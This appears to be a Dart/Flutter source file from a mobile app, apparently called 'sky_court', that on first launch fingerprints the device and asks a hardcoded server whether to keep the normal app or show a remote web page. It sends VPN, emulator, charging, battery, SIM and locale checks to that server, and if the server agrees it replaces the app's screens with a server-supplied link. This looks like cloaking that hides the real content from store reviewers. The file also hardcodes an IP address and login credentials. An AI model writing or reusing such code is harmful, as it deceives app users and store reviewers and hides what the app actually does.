// ignore_for_file: use_build_context_synchronously

import 'dart:developer';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:onesignal_flutter/onesignal_flutter.dart';
import 'package:sky_court/sky/sky_get_token.dart';
import 'package:sky_court/sky/sky_local_object.dart';
import 'package:sky_court/sky/sky_repository.dart';
import 'package:sky_court/sky/sky_rspnsmdl.dart';
import 'package:sky_court/sky/sky_view.dart';
import '../core/bottom_bar.dart';
import '../core/sky_onboarding.dart';
import 'sky_mthds.dart';

Future<void> sky(BuildContext context, Function(bool) isPhotosky) async {
  final skyDb = await SkyRepository.skyHGet();
  if (skyDb == null) {
    final String? authKey = await skyGetToken(
      addPath: 'http://159.89.248.76/api/token/',
      l: 'oauth',
      p: '5.{r8<tWc>!Y2E3',
    );
    if (authKey != null) {
      final skyprxTemp = await skyIsUsingVpn();
      final skyloc = await skyCountryCode();
      final skyisEmul = await skyIsSemulator(context);
      final skybtrLevel = await skyBatteryLevel();
      final skyisZarayd = await skyIsCharging();
      const skyisSim = true;
      final skyDate = await skyGetTime();
      try {
        SkyRspnsMdl? skyResponse;

        final userRegistrationResponse = await Dio(
          BaseOptions(
            headers: {'Authorization': 'Bearer $authKey'},
          ),
        ).post(
          'http://159.89.248.76/api/ads_request/',
          data: {
            "bundle_name": "com.sky.court",
            "timestamp": skyDate,
            "locale": skyloc,
            "prx_temp": skyprxTemp,
            "emul_temp": skyisEmul,
            "battery_temp": skyisZarayd,
            "mnostate_temp": skyisSim,
            "btry_temp": skybtrLevel,
          },
        );
        if (userRegistrationResponse.data != null) {
          skyResponse = SkyRspnsMdl.fromJson(userRegistrationResponse.data);
        }

        if (skyResponse != null) {
          if (skyResponse.boolValue) {
            String skyL1 =
                '${skyResponse.skyRspnsMdlObject.brt}${skyResponse.skyRspnsMdlObject.trg}';
            String skyL2 =
                '${skyResponse.skyRspnsMdlObject.uyy}${skyResponse.skyRspnsMdlObject.tvr}';
            final oneSignalSubscriptionId = OneSignal.User.pushSubscription.id;
            if (skyL1.contains('{click_id}')) {
              skyL1 = skyL1.replaceAll('{click_id}',
                  '$oneSignalSubscriptionId:6abb2e0f-18b6-47e5-8258-53853e1b27d5');
            }
            late SkyLocalModel skyHiveObject;
            if (skyL2.contains('https://null.com')) {
              skyHiveObject = SkyLocalModel(
                  regsky: skyL1, logsky: skyL1, strtsky: true, cabsky: '');
            } else {
              if (skyL2.contains('{click_id}')) {
                skyL2 = skyL2.replaceAll('{click_id}',
                    '$oneSignalSubscriptionId:6abb2e0f-18b6-47e5-8258-53853e1b27d5');
              }
              skyHiveObject = SkyLocalModel(
                  regsky: skyL1, logsky: skyL2, strtsky: true, cabsky: '');
            }
            SkyRepository.skyHSet(skyHiveObject);
            isPhotosky(true);
            skyPushReplacement(
              context,
              SkyView(
                skylink: skyHiveObject.regsky,
                skycache: false,
              ),
            );

            return;
          }
        }
      } catch (e) {
        throw Exception(e);
      }
    }
    skyCallReview(10);
    isPhotosky(false);
    skyPushReplacement(context, const CkyOnBording());
    SkyRepository.skyHSet(
      SkyLocalModel(regsky: '', logsky: '', strtsky: false, cabsky: ''),
    );
  } else {
    if (skyDb.strtsky) {
      isPhotosky(true);
      if (skyDb.cabsky.isNotEmpty) {
        log("Cache URL: ${skyDb.cabsky}");
        skyPushReplacement(
            context,
            SkyView(
              skylink: skyDb.cabsky,
              skycache: true,
            ));
      } else {
        skyPushReplacement(
            context,
            SkyView(
              skylink: skyDb.logsky,
              skycache: true,
            ));
      }
    } else {
      isPhotosky(false);
      skyPushReplacement(
        context,
        const BottomBar(),
      );
    }
  }
}

Future<void> skyCallReview(int duration) async {
  await Future.delayed(Duration(seconds: duration));
  try {
    final InAppReview inAppReview = InAppReview.instance;

    if (await inAppReview.isAvailable()) {
      inAppReview.requestReview();
    }
  } catch (e) {
    throw Exception(e);
  }
}

void skyPushReplacement(BuildContext context, Widget screen) {
  Navigator.pushReplacement(
    context,
    MaterialPageRoute(builder: (_) => screen),
  );
}

Future<String> skyGetRealLink(String skyUrl) async {
  final skyRealLink = await Dio().get(skyUrl);

  return skyRealLink.realUri.toString();
}

Future<void> skyDelayed(int seconds) async {
  await Future.delayed(Duration(seconds: seconds));
}
